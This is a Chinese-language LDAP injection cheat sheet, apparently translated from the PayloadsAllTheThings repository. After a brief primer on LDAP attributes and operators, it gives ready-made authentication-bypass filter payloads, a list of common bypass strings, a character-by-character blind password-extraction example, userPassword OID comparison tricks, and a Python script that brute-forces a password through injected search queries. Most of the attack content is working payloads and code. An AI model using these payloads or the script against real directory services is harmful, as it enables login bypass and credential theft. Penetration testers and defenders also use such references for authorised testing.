# LDAP Injection - LDAP注入

[SEARCH_KEYWORDS]
漏洞类型: LDAP Injection LDAP注入 Lightweight Directory Access Protocol
攻击类型: Authentication Bypass Data Extraction Blind Injection
关键词: uid cn sn dn objectClass userPassword filter (& (| !)
操作符: = ~= >= <= =* *
技术: Wildcard Injection Boolean Injection Blind Extraction

[CONTENT]

## LDAP注入概述

LDAP注入是一种利用基于用户输入构造LDAP语句的Web应用程序的攻击。当应用程序未能正确清理用户输入时，可能通过本地代理修改LDAP语句。

## LDAP基础

### 常用属性

```
cn - Common Name (通用名)
sn - Surname (姓氏)
uid - User ID (用户ID)
dn - Distinguished Name (区分名)
mail - Email (邮箱)
userPassword - 用户密码
objectClass - 对象类
givenName - 名字
```

### 操作符

| 操作符 | 描述 |
|--------|------|
| = | 等于 |
| ~= | 近似等于 |
| >= | 大于等于 |
| <= | 小于等于 |
| =* | 存在性检查 |
| * | 通配符 |

### 逻辑操作符

```
(&filter1filter2)  - AND
(|filter1filter2)  - OR
(!filter)          - NOT
```

## 认证绕过

### 示例1

```sql
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

### 示例2

```sql
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

### 常见绕过Payload

```powershell
*
*)(uid=*))(|(uid=*
admin)(|(password=*
admin)(!(password=*
*)(objectClass=*)
*)(objectClass=user
)(cn=))(|(cn=
```

## 盲注利用

通过字符逐个枚举获取数据：

```sql
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYK*)) : OK
```

## userPassword属性利用

userPassword是OCTET STRING类型，可使用OID进行字节比较：

```bash
userPassword:2.5.13.18:=\xx
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

## 盲注脚本

```python
#!/usr/bin/python3
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    for char in alphabet:
        r = requests.get("http://target?action=dir&search=admin*)(password=" + flag + char)
        if "TRUE CONDITION" in r.text:
            flag += char
            print("[+] Found: " + flag)
            break
```

## 默认属性

可用于注入 `*)(ATTRIBUTE_HERE=*`:

```
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName
```

## 参考文档

原始来源: PayloadsAllTheThings/LDAP Injection/README.md